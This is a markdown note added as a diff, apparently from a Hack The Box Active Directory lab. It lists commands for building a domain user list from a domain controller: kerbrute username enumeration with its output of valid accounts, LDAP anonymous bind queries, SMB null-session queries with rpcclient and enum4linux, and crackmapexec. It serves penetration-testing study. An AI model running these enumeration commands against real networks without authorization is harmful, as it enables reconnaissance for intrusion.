@@ -1,0 +1,112 @@
+# Making a User List
+
+## Kerbrute
+
+```sh
+htb-student@ea-attack01:~$ kerbrute userenum --dc 172.16.5.5 -d INLANEFREIGHT.LOCAL /usr/local/share/wordlists/statistically-likely-usernames/jsmith.txt
+```
+
+```output title="Output"
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: dev (9cfb81e) - 05/23/25 - Ronnie Flathers @ropnop
+
+2025/05/23 15:06:55 >  Using KDC(s):
+2025/05/23 15:06:55 >   172.16.5.5:88
+
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  sbrown@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  tjohnson@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  jwilson@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  jjones@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  bdavis@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  asanchez@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  njohnson@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  dlewis@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  ccruz@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  mmorgan@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  rramirez@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  jwallace@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  jsantiago@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  gdavis@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  mrichardson@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  mharrison@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  tgarcia@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  jmay@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  jmontgomery@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  jhopkins@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  dpayne@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  mhicks@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  adunn@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  lmatthews@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  avazquez@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  mlowe@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  jmcdaniel@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:55 >  [+] VALID USERNAME:  csteele@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:56 >  [+] VALID USERNAME:  mmullins@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:56 >  [+] VALID USERNAME:  mochoa@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:56 >  [+] VALID USERNAME:  aslater@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:56 >  [+] VALID USERNAME:  ehoffman@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:56 >  [+] VALID USERNAME:  ehamilton@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:56 >  [+] VALID USERNAME:  cpennington@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:56 >  [+] VALID USERNAME:  srosario@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:56 >  [+] VALID USERNAME:  lbradford@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:57 >  [+] VALID USERNAME:  halvarez@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:57 >  [+] VALID USERNAME:  gmccarthy@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:57 >  [+] VALID USERNAME:  dbranch@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:57 >  [+] VALID USERNAME:  mshoemaker@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:57 >  [+] VALID USERNAME:  mholliday@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:57 >  [+] VALID USERNAME:  ngriffith@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:57 >  [+] VALID USERNAME:  sinman@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:57 >  [+] VALID USERNAME:  minman@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:58 >  [+] VALID USERNAME:  rhester@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:58 >  [+] VALID USERNAME:  rburrows@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:58 >  [+] VALID USERNAME:  dpalacios@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:58 >  [+] VALID USERNAME:  strent@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:58 >  [+] VALID USERNAME:  fanthony@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:58 >  [+] VALID USERNAME:  evalentin@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:59 >  [+] VALID USERNAME:  sgage@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:59 >  [+] VALID USERNAME:  jshay@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:59 >  [+] VALID USERNAME:  jhermann@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:59 >  [+] VALID USERNAME:  whouse@INLANEFREIGHT.LOCAL
+2025/05/23 15:06:59 >  [+] VALID USERNAME:  emercer@INLANEFREIGHT.LOCAL
+2025/05/23 15:07:01 >  [+] VALID USERNAME:  wshepherd@INLANEFREIGHT.LOCAL
+2025/05/23 15:07:02 >  Done! Tested 48705 usernames (56 valid) in 7.495 seconds
+```
+
+## LDAP Anonymous Bind
+
+### ldapsearch
+
+```sh
+htb-student@ea-attack01:~$ ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -d ' ' -f 2
+```
+
+### windapsearch
+
+```sh
+htb-student@ea-attack01:~$ windapsearch.py --dc-ip 172.16.5.5 -d INLANEFREIGHT.LOCAL -u '' -U | grep userPrincipalName: | cut -d ' ' -f 2 | cut -d '@' -f 1
+```
+
+## SMB NULL Session
+
+### rpcclient
+
+```sh
+htb-student@ea-attack01:~$ rpcclient -N -U "" 172.16.5.5 -c "enumdomusers" | grep -oP '(?<=user:\[)[^\]]+(?=\])'
+```
+
+### enum4linux
+
+```sh
+htb-student@ea-attack01:~$ enum4linux -U 172.16.5.5 | grep user: | grep -oP '(?<=user:\[)[^\]]+(?=\])'
+```
+
+### CrackMapExec
+
+```sh
+htb-student@ea-attack01:~$ crackmapexec smb 172.16.5.5 --users
+```
